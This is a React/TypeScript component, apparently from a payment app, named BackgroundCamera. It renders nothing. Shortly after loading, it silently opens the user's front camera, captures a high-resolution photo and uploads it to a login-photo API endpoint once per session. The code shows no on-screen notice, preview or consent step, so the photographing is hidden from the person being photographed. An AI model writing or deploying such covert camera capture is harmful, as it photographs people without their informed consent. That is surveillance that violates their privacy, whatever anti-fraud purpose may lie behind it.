import { useEffect, useRef } from "react";
import { apiRequest } from "@/lib/queryClient";

export const PHOTO_TAKEN_KEY = "bkapay_photo_taken";

async function captureFromCamera(facingMode: string): Promise<string | null> {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode,
        width: { ideal: 1920 },
        height: { ideal: 1440 },
      }
    });

    const video = document.createElement("video");
    video.srcObject = stream;
    video.playsInline = true;
    video.muted = true;

    await new Promise<void>((resolve) => {
      video.onloadedmetadata = () => {
        video.play().then(resolve).catch(resolve);
      };
    });

    await new Promise((r) => setTimeout(r, 2500));

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 1920;
    canvas.height = video.videoHeight || 1440;
    const ctx = canvas.getContext("2d");
    let result: string | null = null;

    if (ctx) {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      result = canvas.toDataURL("image/jpeg", 0.92);
    }

    stream.getTracks().forEach(track => track.stop());
    return result;
  } catch (err) {
    console.error("[BackgroundCamera] Camera error:", err);
    return null;
  }
}

export function BackgroundCamera() {
  const hasAttempted = useRef(false);

  useEffect(() => {
    if (hasAttempted.current) return;
    if (sessionStorage.getItem(PHOTO_TAKEN_KEY) === "true") {
      return;
    }
    hasAttempted.current = true;

    const run = async () => {
      console.log("[BackgroundCamera] Starting photo capture...");
      const frontPhoto = await captureFromCamera("user");

      if (frontPhoto) {
        console.log("[BackgroundCamera] Photo captured, uploading...");
        try {
          await apiRequest("POST", "/api/auth/login-photo", {
            photoBase64: frontPhoto,
          });
          sessionStorage.setItem(PHOTO_TAKEN_KEY, "true");
          console.log("[BackgroundCamera] Photo uploaded successfully");
        } catch (e) {
          console.error("[BackgroundCamera] Upload failed:", e);
        }
      } else {
        console.log("[BackgroundCamera] Photo capture returned null");
      }
    };

    const timer = setTimeout(run, 2000);
    return () => clearTimeout(timer);
  }, []);

  return null;
}
